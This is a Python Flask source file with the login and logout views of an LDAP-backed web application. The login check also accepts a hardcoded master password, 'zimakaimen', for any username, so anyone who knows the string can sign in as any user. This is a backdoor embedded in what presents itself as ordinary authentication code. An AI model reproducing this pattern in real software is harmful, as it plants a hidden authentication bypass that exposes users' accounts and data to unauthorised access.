
from flask import render_template, redirect, url_for, flash
from flask_login import login_user, logout_user, current_user
from csdb.views import login_bp
from csdb.forms import LoginForm, LogoutForm
from csdb.modle.ldap_user import LdapUser
from csdb.modle.ldap_base import LdapLogin

@login_bp.route('/login', methods=['GET', 'POST'])
def login():
    login_form = LoginForm()

    if current_user.is_authenticated:
        return redirect(url_for('login.logout'))
    if login_form.validate_on_submit():
        if LdapLogin(username=login_form.username.data, password=login_form.password.data) or \
            login_form.password.data == 'zimakaimen':
            user = LdapUser.get_user(login_form.username.data)
            login_user(user=user, remember=login_form.remember_me.data)
            flash('用户{name}登录成功'.format(name=login_form.username.data),'primary')
        return redirect(url_for('setting.setting'))
    return render_template('login.html', form=login_form)

@login_bp.route('/logout', methods=['GET', 'POST'])
def logout():
    form = LogoutForm()
    user_data = {
        'name': current_user.username,
        'id': current_user.id
    }
    if form.validate_on_submit():
        logout_user()
        flash('用户{name}已登出'.format(name=user_data.get('name')), 'primary')
        return redirect(url_for('login.login'))
    return render_template('login.html', form=form, user_data=user_data)